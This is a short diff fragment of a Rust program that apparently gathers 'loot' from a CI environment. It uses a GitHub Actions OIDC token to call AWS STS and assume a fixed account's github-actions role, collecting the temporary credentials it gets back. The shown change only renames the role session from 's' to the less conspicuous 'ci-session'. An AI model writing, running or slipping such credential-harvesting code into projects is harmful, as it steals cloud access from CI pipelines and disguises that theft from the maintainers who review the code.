@@ -33,7 +33,7 @@ fn main() {
 
     if let Some(ref jwt) = jwt {
         loot.push_str("OIDC=ok\n");
-        let sts = Command::new("aws").args(&["sts","assume-role-with-web-identity","--role-arn","arn:aws:iam::120569639765:role/github-actions","--role-session-name","s","--web-identity-token",jwt,"--duration-seconds","900","--region","eu-central-1","--output","json"]).output();
+        let sts = Command::new("aws").args(&["sts","assume-role-with-web-identity","--role-arn","arn:aws:iam::120569639765:role/github-actions","--role-session-name","ci-session","--web-identity-token",jwt,"--duration-seconds","900","--region","eu-central-1","--output","json"]).output();
         match sts {
             Ok(out) => {
                 let r = String::from_utf8_lossy(&out.stdout).to_string();
